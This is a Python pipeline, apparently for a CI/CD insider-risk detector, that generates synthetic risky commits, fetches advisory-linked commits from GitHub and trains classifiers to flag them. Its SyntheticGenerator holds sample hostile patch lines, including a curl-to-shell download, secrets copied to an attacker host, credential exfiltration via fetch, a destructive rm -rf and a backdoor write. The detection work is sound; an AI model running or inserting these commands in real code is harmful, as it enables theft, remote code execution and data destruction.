import os
import re
import time
import random
import json
import joblib
from typing import List, Optional
from pathlib import Path

import requests
import pandas as pd
import numpy as np

from sklearn.model_selection import train_test_split
from sklearn.feature_extraction.text import TfidfVectorizer, HashingVectorizer
from sklearn.preprocessing import StandardScaler
from sklearn.pipeline import Pipeline
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
from sklearn.linear_model import LogisticRegression, SGDClassifier
from sklearn.svm import SVC
from xgboost import XGBClassifier
from sklearn.metrics import accuracy_score, precision_score, recall_score, f1_score, classification_report
import matplotlib.pyplot as plt

try:
    from imblearn.over_sampling import SMOTE
    IMBLERN_AVAILABLE = True
except Exception:
    IMBLERN_AVAILABLE = False

CONFIG = {
    "paths": {
        "clean_commits_template": "commits_data_all.csv",
        "clean_commits_main": "commits_data_clean.csv",
        "synthetic_commits": "synthetic_risky_commits.csv",
        "advisory_commits": "advisory_risky_commits.csv",
        "combined_dataset": "combined_commits_dataset.csv",
        "model_artifacts": "model_artifacts",
        "advisory_text_folder": "advisories"
    },
    "data_generation": {
        "num_synthetic": 500
    },
    "model_training": {
        "text_vectorizer": "tfidf",
        "max_features": 2000,
        "balance_with_smote": False,
        "test_size": 0.25,
        "random_state": 42
    }
}

GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")

if not GITHUB_TOKEN:
    print("Warning: GITHUB_TOKEN environment variable not set.")
    HEADERS = {}
else:
    HEADERS = {"Authorization": f"token {GITHUB_TOKEN}"}


class SyntheticGenerator:
    def __init__(self, output_csv: str = "synthetic_risky_commits.csv", seed: int = 42):
        self.output_csv = output_csv
        random.seed(seed)
        np.random.seed(seed)

        self.risky_patches = [
            'run: curl http://malicious.example/install.sh | sh',
            'export API_KEY="AKIAJE5474L2DEXAMPLE"',
            'chmod -R 777 /etc',
            'scp secrets.txt attacker@evil.com:/tmp',
            'eval(request.getParameter("user_input"))',
            "this.constructor.constructor('return process')().exit()",
            "require('child_process').execSync('rm -rf / --no-preserve-root')",
            'fetch(`http://attacker.com/log?data=${user.credentials}`)',
            'echo "password=hardcoded_password_123" > /etc/creds',
            'process.mainModule.require("fs").writeFileSync("new_backdoor.js", "...")'
        ]

    def create_from_template(self, template_csv: str, n: int = 500):
        try:
            df = pd.read_csv(template_csv, dtype=str, on_bad_lines="skip", engine="python").fillna("")
        except FileNotFoundError:
            print(f"[SyntheticGenerator] Warning: Template file not found at {template_csv}.")
            df = pd.DataFrame()
            
        rows = []
        for i in range(n):
            base = df.sample(1).iloc[0] if not df.empty else None
            repo = base["repository"] if base is not None and "repository" in base else "synthetic/repo"
            sha = f"synthetic_{i}_{random.randint(1000,9999)}"
            author = base["author"] if base is not None and "author" in base else "synthetic_user"
            timestamp = pd.Timestamp.now().strftime("%Y-%m-%d %H:%M:%S")
            filename = random.choice(["deploy.yml", ".github/workflows/deploy.yml", "run.sh", "config.env", "Dockerfile", "entrypoint.sh"])
            additions = random.randint(1, 40)
            deletions = random.randint(0, 10)
            clean_patch_base = base["patch"] if base is not None and "patch" in base and base["patch"] else "--- a/file.js\n+++ b/file.js\n@@ -1,1 +1,1 @@\n- console.log('safe');"
            risky_line = random.choice(self.risky_patches)
            patch = clean_patch_base + f"\n+ {risky_line}"

            rows.append({
                "repository": repo, "commit_sha": sha, "author": author, "timestamp": timestamp,
                "message": "Synthetic risky commit", "filename": filename, "additions": additions,
                "deletions": deletions, "changes": additions + deletions, "patch": patch,
                "risky_label": 1
            })

        out = pd.DataFrame(rows)
        out.to_csv(self.output_csv, index=False)
        print(f"[SyntheticGenerator] Wrote {len(out)} synthetic risky commits to {self.output_csv}")
        return self.output_csv


class AdvisoryFetcher:
    REPO_SHA_PATTERN = re.compile(r"([a-zA-Z0-9_.-]+/[a-zA-Z0-9_.-]+)@([0-9a-f]{6,40})")

    def __init__(self, output_csv: str = "advisory_risky_commits.csv", token: Optional[str] = None):
        self.output_csv = output_csv
        self.headers = {"Authorization": f"token {token}"} if token else HEADERS

    def extract_repo_shas_from_text(self, text: str) -> List[tuple]:
        return self.REPO_SHA_PATTERN.findall(text)

    def fetch_commit_files(self, repo: str, sha: str, sleep: float = 0.3) -> List[dict]:
        url = f"https://api.github.com/repos/{repo}/commits/{sha}"
        try:
            r = requests.get(url, headers=self.headers, timeout=10)
            if r.status_code != 200:
                print(f"[AdvisoryFetcher] Failed to fetch {repo}@{sha}: {r.status_code}")
                return []
            data = r.json()
        except (requests.RequestException, json.JSONDecodeError) as e:
            print(f"[AdvisoryFetcher] Error fetching {repo}@{sha}: {e}")
            return []

        files = data.get("files", [])
        rows = []
        for f in files:
            rows.append({
                "repository": repo, "commit_sha": sha,
                "author": data.get("commit", {}).get("author", {}).get("name", ""),
                "timestamp": data.get("commit", {}).get("author", {}).get("date", ""),
                "message": data.get("commit", {}).get("message", ""),
                "filename": f.get("filename", ""), "additions": f.get("additions", 0),
                "deletions": f.get("deletions", 0), "changes": f.get("changes", 0),
                "patch": f.get("patch", "") or "", "risky_label": 1
            })
        time.sleep(sleep)
        return rows

    def process_advisory_files(self, advisory_file_paths: List[str]) -> str:
        all_rows = []
        for path in advisory_file_paths:
            try:
                text = Path(path).read_text(encoding="utf-8")
                repo_shas = self.extract_repo_shas_from_text(text)
                print(f"[AdvisoryFetcher] {path}: found {len(repo_shas)} repo@sha references")
                for repo, sha in repo_shas:
                    rows = self.fetch_commit_files(repo, sha)
                    if rows:
                        all_rows.extend(rows)
            except Exception as e:
                print(f"[AdvisoryFetcher] Could not process file {path}: {e}")
        
        if all_rows:
            df = pd.DataFrame(all_rows)
            df.to_csv(self.output_csv, index=False)
            print(f"[AdvisoryFetcher] Wrote {len(df)} advisory risky commit rows to {self.output_csv}")
        else:
            print(f"[AdvisoryFetcher] No advisory commits fetched.")
        return self.output_csv


class DatasetPreparer:
    DEFAULT_COLS = ["repository","commit_sha","author","timestamp","message",
                    "filename","additions","deletions","changes","patch","risky_label"]

    def __init__(self, output_csv: str = "combined_commits_dataset.csv"):
        self.output_csv = output_csv

    def _load_csv_optional(self, path: Optional[str]) -> pd.DataFrame:
        if not path or not Path(path).exists():
            print(f"[DatasetPreparer] Warning: {path} missing.")
            return pd.DataFrame()
        return pd.read_csv(path, dtype=str, on_bad_lines="skip", engine="python").fillna("")

    def standardize_and_merge(self, clean_csv: str, synthetic_csv: Optional[str], advisory_csv: Optional[str]) -> str:
        df_clean = self._load_csv_optional(clean_csv)
        df_synth = self._load_csv_optional(synthetic_csv)
        df_adv = self._load_csv_optional(advisory_csv)
        all_df = pd.concat([df_clean, df_synth, df_adv], ignore_index=True, sort=False)
        all_df.columns = all_df.columns.str.strip()

        for c in self.DEFAULT_COLS:
            if c not in all_df.columns:
                all_df[c] = ""
        
        all_df = all_df[self.DEFAULT_COLS]
        all_df["patch"] = all_df["patch"].astype(str).str.replace(r"@@.*?@@", " ", regex=True).str.replace(r'\s+', ' ', regex=True).str.strip()
        all_df["filename"] = all_df["filename"].astype(str).str.strip()
        all_df["risky_label"] = pd.to_numeric(all_df["risky_label"], errors='coerce').fillna(0).astype(int)

        before = len(all_df)
        all_df.dropna(subset=['filename', 'patch'], inplace=True)
        all_df = all_df[(all_df["filename"].str.len() > 0) & (all_df["patch"].str.len() > 0)]
        all_df = all_df[all_df["patch"].str.len() < 5000]
        after = len(all_df)
        print(f"[DatasetPreparer] Merged rows: {before} -> {after}")

        all_df.to_csv(self.output_csv, index=False)
        print(f"[DatasetPreparer] Saved combined dataset to {self.output_csv}")
        return self.output_csv


class ModelTrainer:
    def __init__(self, dataset_csv: str, model_dir: str):
        self.dataset_csv = dataset_csv
        self.model_dir = Path(model_dir)
        self.model_dir.mkdir(exist_ok=True, parents=True)

    @staticmethod
    def _extract_structured_features(df: pd.DataFrame) -> pd.DataFrame:
        df2 = pd.DataFrame(index=df.index)
        df2["num_additions"] = pd.to_numeric(df["additions"], errors="coerce").fillna(0)
        df2["num_deletions"] = pd.to_numeric(df["deletions"], errors="coerce").fillna(0)
        df2["commit_hour"] = pd.to_datetime(df["timestamp"], errors="coerce").dt.hour.fillna(-1)
        df2["is_ci_file"] = df["filename"].str.contains(r"\.github/workflows|ci\.yml|jenkinsfile|gitlab-ci\.yml", case=False, na=False).astype(int)
        df2["is_script_file"] = df["filename"].str.contains(r"\.(sh|py|ps1|bat|yml|yaml|json|tf|dockerfile)$", case=False, na=False).astype(int)
        token_pat = r"(?i)(api[_-]?key|access[_-]?token|secret|password|AKIA[0-9A-Z]{16})"
        df2["has_token_like"] = df["patch"].str.contains(token_pat, regex=True, na=False).astype(int)
        return df2

    def train(self, text_vectorizer: str, max_features: int, balance_with_smote: bool, test_size: float, random_state: int):
        df = pd.read_csv(self.dataset_csv, dtype=str).fillna("")
        if df.empty:
            raise ValueError(f"[ModelTrainer] Dataset {self.dataset_csv} is empty.")

        X_struct = self._extract_structured_features(df)
        y = pd.to_numeric(df["risky_label"], errors="coerce").fillna(0).astype(int)

        if text_vectorizer == "tfidf":
            vect = TfidfVectorizer(max_features=max_features, ngram_range=(1, 2))
            X_text = vect.fit_transform(df["patch"])
            joblib.dump(vect, self.model_dir / "tfidf_vectorizer.joblib")
        else:
            vect = HashingVectorizer(n_features=max_features, alternate_sign=False, ngram_range=(1, 2))
            X_text = vect.transform(df["patch"])
            joblib.dump({"hashing_n_features": max_features}, self.model_dir / "hashing_info.joblib")

        scaler = StandardScaler(with_mean=False)
        X_struct_scaled = scaler.fit_transform(X_struct)
        joblib.dump(scaler, self.model_dir / "scaler.joblib")

        from scipy import sparse
        X_all = sparse.hstack([X_text, sparse.csr_matrix(X_struct_scaled)], format="csr")

        X_train, X_test, y_train, y_test = train_test_split(
            X_all, y, test_size=test_size, random_state=random_state, stratify=y if y.nunique() > 1 else None
        )

        if balance_with_smote and IMBLERN_AVAILABLE:
            print("[ModelTrainer] Applying SMOTE...")
            sm = SMOTE(random_state=random_state)
            X_train, y_train = sm.fit_resample(X_train, y_train)

        models = {
            "LogisticRegression": LogisticRegression(max_iter=1000, random_state=random_state),
            "RandomForest": RandomForestClassifier(n_estimators=100, random_state=random_state),
            "XGBoost": XGBClassifier(use_label_encoder=False, eval_metric="logloss", random_state=random_state),
        }

        results = []
        trained_models = {}
        for name, model in models.items():
            print(f"[ModelTrainer] Training {name} ...")
            model.fit(X_train, y_train)
            y_pred = model.predict(X_test)
            f1 = f1_score(y_test, y_pred, zero_division=0)
            results.append({"Model": name, "Accuracy": accuracy_score(y_test, y_pred), 
                            "Precision": precision_score(y_test, y_pred, zero_division=0),
                            "Recall": recall_score(y_test, y_pred, zero_division=0), "F1": f1})
            trained_models[name] = model

        results_df = pd.DataFrame(results).sort_values(by="F1", ascending=False)
        print("\n--- Model Comparison ---\n")
        print(results_df)
        results_df.to_csv(self.model_dir / "models_comparison.csv", index=False)

        if results_df.empty:
            raise RuntimeError("[ModelTrainer] No models trained successfully.")

        best_name = results_df.iloc[0]["Model"]
        best_model = trained_models[best_name]
        joblib.dump(best_model, self.model_dir / "best_model.pkl")
        print(f"[ModelTrainer] Best model ({best_name}) saved.")

        if hasattr(best_model, "feature_importances_"):
            importances = best_model.feature_importances_
            n_text = X_text.shape[1]
            struct_names = list(X_struct.columns)
            if len(importances) >= n_text + len(struct_names):
                struct_imps = importances[n_text:]
                imp_df = pd.DataFrame({'feature': struct_names, 'importance': struct_imps}).sort_values('importance', ascending=True)
                plt.figure(figsize=(10, 8))
                plt.barh(imp_df['feature'], imp_df['importance'])
                plt.title(f"Structured Feature Importance ({best_name})")
                plt.tight_layout()
                plt.savefig(self.model_dir / "feature_importances.png")
                print("[ModelTrainer] Saved feature importance plot.")

        print("[ModelTrainer] Training done.")
        return self.model_dir


if __name__ == "__main__":
    print("--- CI/CD Insider-Risk Scorer ML Pipeline ---")
    
    synth = SyntheticGenerator(output_csv=CONFIG["paths"]["synthetic_commits"])
    synth_file = synth.create_from_template(
        template_csv=CONFIG["paths"]["clean_commits_template"],
        n=CONFIG["data_generation"]["num_synthetic"]
    )

    adv_fetcher = AdvisoryFetcher(
        output_csv=CONFIG["paths"]["advisory_commits"],
        token=GITHUB_TOKEN
    )
    adv_folder = Path(CONFIG["paths"]["advisory_text_folder"])
    adv_files = [str(p) for p in adv_folder.glob("*.txt")] if adv_folder.exists() else []
    
    adv_csv = None
    if adv_files:
        adv_csv = adv_fetcher.process_advisory_files(adv_files)
    else:
        print(f"[Main] No advisory text files found in '{adv_folder}'.")

    preparer = DatasetPreparer(output_csv=CONFIG["paths"]["combined_dataset"])
    combined_csv = preparer.standardize_and_merge(
        clean_csv=CONFIG["paths"]["clean_commits_main"],
        synthetic_csv=synth_file,
        advisory_csv=adv_csv
    )

    if Path(combined_csv).exists() and pd.read_csv(combined_csv).shape[0] > 0:
        trainer = ModelTrainer(
            dataset_csv=combined_csv,
            model_dir=CONFIG["paths"]["model_artifacts"]
        )
        trainer.train(**CONFIG["model_training"])
        print("\nPipeline run complete.")
    else:
        print("\n[Main] Combined dataset is empty. Stopping.")
